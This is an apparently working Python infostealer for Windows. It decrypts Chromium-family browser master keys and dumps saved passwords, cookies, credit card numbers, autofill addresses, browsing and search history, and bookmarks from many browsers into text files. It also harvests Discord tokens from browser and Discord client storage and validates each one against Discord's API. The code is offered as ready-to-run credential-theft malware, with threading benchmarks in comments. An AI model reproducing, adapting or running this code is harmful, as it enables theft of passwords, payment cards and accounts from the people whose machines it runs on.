from win32crypt import CryptUnprotectData
from damuffin import TemporaryDirectory
from os.path import exists as path_exists
from Crypto.Cipher import AES
import threading
import requests
import sqlite3
import shutil
import base64
import json
import time
import re
import os

roaming = os.environ["APPDATA"]
localdata = os.environ["LOCALAPPDATA"]

def mkfile(path):
    with open(path, "w") as newfile: newfile.close()

##───────────────────────────────────────────────────────────────────────#
#│ Benchmarks for collecting browser data with & without threading.      │
#│   Data collected: [Login Data, Web Data, Cookies, History, Bookmarks] │
##───────────────────────────────────────────────────────────────────────#
#│   [NO THREADING]:                                                     │
#│       [1]:                                                            │
#│           google chrome (Default):    0.269001007080078100            │
#│           google chrome (Profile 1):  0.014996767044067383            │
#│           mircosoft edge:             0.014004945755004883            │
#│           opera gx:                   0.024998903274536133            │
#│       [2]:                                                            │
#│           google chrome (Default):    0.269000768661499000            │
#│           google chrome (Profile 1):  0.015999317169189453            │
#│           mircosoft edge:             0.014000177383422852            │
#│           opera gx:                   0.025996685028076172            │
#│       [3]:                                                            │
#│           google chrome (Default):    0.273999214172363300            │
#│           google chrome (Profile 1):  0.014000415802001953            │
#│           mircosoft edge:             0.013999462127685547            │
#│           opera gx:                   0.024998903274536133            │
##───────────────────────────────────────────────────────────────────────#
#│   [WITH THREADING]:                                                   │
#│       [1]:                                                            │
#│           google chrome (Default):    0.0010001659393310547           │
#│           google chrome (Profile 1):  0.0010020732879638672           │
#│           mircosoft edge:             0.0010006427764892578           │
#│           opera gx:                   0.0010011196136474610           │
#│       [2]:                                                            │
#│           google chrome (Default):    0.0009992122650146484           │
#│           google chrome (Profile 1):  0.0020003318786621094           │
#│           mircosoft edge:             0.0009975433349609375           │
#│           opera gx:                   0.0019993782043457030           │
#│       [3]:                                                            │
#│           google chrome (Default):    0.0010001659393310547           │
#│           google chrome (Profile 1):  0.0020041465759277344           │
#│           mircosoft edge:             0.0010001659393310547           │
#│           opera gx:                   0.0010006427764892578           │
##───────────────────────────────────────────────────────────────────────#

class BrowserTools:
    def __init__(self, dir=None, localstate=None):
        self.path = dir
        self.localstate = localstate
        self.dump_files = []
    
    def get_master_key(self, localstate=None):
        with open(self.localstate if localstate is None else localstate, 'r', encoding='utf-8') as file:
            return CryptUnprotectData(base64.b64decode(json.loads(file.read())['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
    
    def decrypt(self, data, key):
        try: return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
        except Exception as e:
            try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except Exception as e: print(e); return "Unsupported"
    
    def get_discord_tokens(self, browsers):
        paths = {b: p for b, p in {
            **{b: p + "\\Local Storage\\leveldb\\" for b, p in browsers.items()},
            'discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'discordcanary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'discordptb': roaming + '\\discordptb\\Local Storage\\leveldb\\'
        }.items() if os.path.exists(p)}

        discord_tokens = []
        for browser, path in paths.items():
            for file in os.listdir(path):
                if os.path.splitext(file)[-1] not in [".log", ".ldb"]: continue
                
                with open(f"{path}\\{file}", errors="ignore") as f:
                    for line in [x.strip() for x in f.readlines() if x.strip()]:
                        if not "cord" in path:
                            [discord_tokens.append(t) for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line) if self.__validate_discord_token(t)]
                            continue
                        
                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            localstate = f"{roaming}\\{browser}\\Local State"
                            if not os.path.exists(localstate): continue
                            token = self.decrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(localstate))

                            if not self.__validate_discord_token(token): continue
                            discord_tokens.append(token)
        return discord_tokens

    def __validate_discord_token(self, token):
        return requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': token}).status_code == 200

    def cookies(self, cookie_file):
        db_file = self.path + "\\Cookies.db"
        raw_cookies = self.path + "\\cookies.txt"
        shutil.copy2(cookie_file, db_file)
        self.dump_files.append(db_file)

        key = self.get_master_key()
        conn = sqlite3.connect(db_file, check_same_thread=False)
        cursor = conn.cursor()
        with open(raw_cookies, 'a', encoding='utf-8') as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt(encrypted_value, key)
                if host_key != "" and name != "" and value != "" and value != "Unsupported":
                    f.write(f"{host_key:50s} {str(expires_utc == 0):10s} {path:10s} {str(host_key.startswith('.')):10s} {str(expires_utc):20s} {name:50s} {value}\n")
        cursor.close()
        conn.close()
    
    def login_data(self, login_file):
        db_file = self.path + "\\Login Data.db"
        raw_login_data = self.path + "\\login-data.txt"
        shutil.copy2(login_file, db_file)
        self.dump_files.append(db_file)

        key = self.get_master_key()
        conn = sqlite3.connect(db_file, check_same_thread=False)
        cursor = conn.cursor()

        with open(raw_login_data, 'wb') as f:
            f.write(json.dumps([[res[0], res[1], self.decrypt(res[2], key)] for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall() if res[0] != "" and res[1] != "" and res[2] != ""], indent=4).encode("utf8"))
        cursor.close()
        conn.close()

    def web_data(self, webdata_file):
        self.credit_cards(webdata_file)
        self.addresses(webdata_file)

    def credit_cards(self, webdata_file):
        db_file = self.path + "\\Credit Cards.db"
        raw_web_data = self.path + "\\credit-cards.txt"
        shutil.copy2(webdata_file, db_file)
        self.dump_files.append(db_file)

        key = self.get_master_key()
        conn = sqlite3.connect(db_file, check_same_thread=False)
        cursor = conn.cursor()

        with open(raw_web_data, 'wb') as f:
            for res in cursor.execute('SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards;').fetchall(): # SELECT * FROM credit_cards;
                guid, name, month, year, number, nickname = res
                number = self.decrypt(number, key)

                f.write(json.dumps({
                    guid: {
                        'name': name,
                        'nickname': nickname,
                        'number': number,
                        'expires': f"{month}-{year}"
                    }
                }).encode('utf8'))
        cursor.close()
        conn.close()
    
    def addresses(self, webdata_file):
        db_file = self.path + "\\Addresses.db"
        raw_web_data = self.path + "\\addresses.txt"
        shutil.copy2(webdata_file, db_file)
        self.dump_files.append(db_file)

        conn = sqlite3.connect(db_file, check_same_thread=False)
        cursor = conn.cursor()

        with open(raw_web_data, "wb") as f:
            for res in cursor.execute("SELECT guid, street_address, street_name, house_number, city, state, zip_code, country_code, apartment_number, floor FROM autofill_profile_addresses;").fetchall():
                guid, street_address, street_name, house_number, city, state, zip_code, country_code, apartment_number, apartment_floor = res

                f.write(json.dumps({
                    guid: {
                        'street': {
                            'address': street_address,
                            'name': street_name,
                            'house number': house_number
                        },
                        'apartment': {
                            'number': apartment_number,
                            'floor': apartment_floor
                        },
                        'location': {
                            'city': city,
                            'state': state,
                            'zip code': zip_code,
                            'country': country_code
                        }
                    }
                }, indent=4).encode("utf8"))
        cursor.close()
        conn.close()

    def bookmarks(self, bookmarks_file):
        with open(os.path.join(self.path, "bookmarks.txt"), "wb") as jsonfile:
            jsonfile.write(json.dumps([bookmark["url"] for bookmark in json.load(open(bookmarks_file))["roots"]["bookmark_bar"]["children"]], indent=4).encode('utf8'))

    def history(self, history_file):
        self.web_history(history_file)
        self.search_history(history_file)

    def web_history(self, history_file):
        db_file = self.path + "\\Web History.db"
        raw_history_file = self.path + "\\web-history.txt"
        shutil.copy2(history_file, db_file)
        self.dump_files.append(db_file)

        conn = sqlite3.connect(db_file, check_same_thread=False)
        cursor = conn.cursor()

        with open(raw_history_file, "wb") as f:
            sites = [res for res in cursor.execute("SELECT title, url, visit_count FROM urls").fetchall()]
            sites.sort(key=lambda x: x[-1], reverse=True)
            f.write(json.dumps([{"title": site[0], "url": site[1], "visit count": site[2]} for site in sites], indent=4).encode('utf8'))
        cursor.close()
        conn.close()

    def search_history(self, history_file):
        db_file = self.path + "\\Search History.db"
        raw_history_file = self.path + "\\search-history.txt"
        shutil.copy2(history_file, db_file)
        self.dump_files.append(db_file)

        conn = sqlite3.connect(db_file, check_same_thread=False)
        cursor = conn.cursor()

        with open(raw_history_file, "wb") as f:
            f.write(json.dumps([res[0] for res in cursor.execute("SELECT term FROM keyword_search_terms;").fetchall() if res[0] == ""], indent=4).encode("utf8"))
        cursor.close()
        conn.close()

    def collect(self, LoginData="", WebData="", Cookies="", History="", Bookmarks=""):
        threads = []
        if path_exists(LoginData):
            threads.append(threading.Thread(target=self.login_data, args=(LoginData,)))

        if path_exists(WebData):
            threads.append(threading.Thread(target=self.web_data, args=(WebData,)))

        if path_exists(Cookies):
            threads.append(threading.Thread(target=self.cookies, args=(Cookies,)))

        if path_exists(History):
            threads.append(threading.Thread(target=self.history, args=(History,)))

        if path_exists(Bookmarks):
            threads.append(threading.Thread(target=self.bookmarks, args=(Bookmarks,)))

        for thread in threads: 
            thread.start()
    
    def cleanup_dump(self):
        for file in self.dump_files:
            os.remove(file)
        self.dump_files.clear()

class Browsers:
    def __init__(self, temp):
        if not isinstance(temp, TemporaryDirectory):
            raise ValueError("Expected a damuffin.TemporaryDirectory.")

        self.browers = {
            k: v for k, v in {
                'amigo': localdata + '\\Amigo\\User Data',
                'torch': localdata + '\\Torch\\User Data',
                'kometa': localdata + '\\Kometa\\User Data',
                'orbitum': localdata + '\\Orbitum\\User Data',
                'cent-browser': localdata + '\\CentBrowser\\User Data',
                '7star': localdata + '\\7Star\\7Star\\User Data',
                'sputnik': localdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': localdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': localdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': localdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': localdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': localdata + '\\Microsoft\\Edge\\User Data',
                'uran': localdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': localdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': localdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': localdata + '\\Iridium\\User Data',
                'opera': roaming + '\\Opera Software\\Opera Stable',
                'opera gx': roaming + '\\Opera Software\\Opera GX Stable'
        }.items() if os.path.exists(v)}

        profiles = ["\\Default", "\\Profile 1", "\\Profile 2", "\\Profile 3", "\\Profile 4", "\\Profile 5"]
        files = ["\\Web Data", "\\Login Data", "\\Network\\Cookies", "\\History", "\\Bookmarks"]

        self.profile_browsers = {b: [[l, set([p + l + f for f in files if path_exists(p + l + f)])] for l in profiles if path_exists(p + l)] for b, p in self.browers.items()}
        self.nonprofile_browsers = {b: {self.browers[b] + f for f in files if path_exists(self.browers[b] + f)} for b, p in self.profile_browsers.items() if p == []}
        self.profile_browsers = {k: v for k, v in self.profile_browsers.items() if v != []} # Remove Non Profile Browsers

        # Creating a local copy of browser files prevents
        # errors when threading sqlite3 databases.
        for b, p in {**self.nonprofile_browsers, **self.profile_browsers}.items():
            folder = os.path.join(temp.path, b)
            if not path_exists(folder): os.mkdir(folder)

            tools = BrowserTools(temp.path + "\\" + b, self.browers[b] + "\\Local State")
            if isinstance(p, list):
                for profile in p:
                    pfolder = folder + profile[0]
                    tools.path = pfolder
                    os.mkdir(pfolder)

                    local_copies = {x: os.path.join(folder, os.path.basename(x)) for x in profile[-1]}
                    for x, c in local_copies.items():
                        mkfile(c); shutil.copy2(x, c)
                    tools.collect(**{os.path.basename(_).replace(" ", ""): _ for _ in local_copies})
            elif isinstance(p, (tuple, set)):
                local_copies = {x: os.path.join(folder, os.path.basename(x)) for x in p}
                for x, c in local_copies.items():
                    mkfile(c); shutil.copy2(x, c)
                tools.collect(**{os.path.basename(_).replace(" ", ""): _ for _ in local_copies})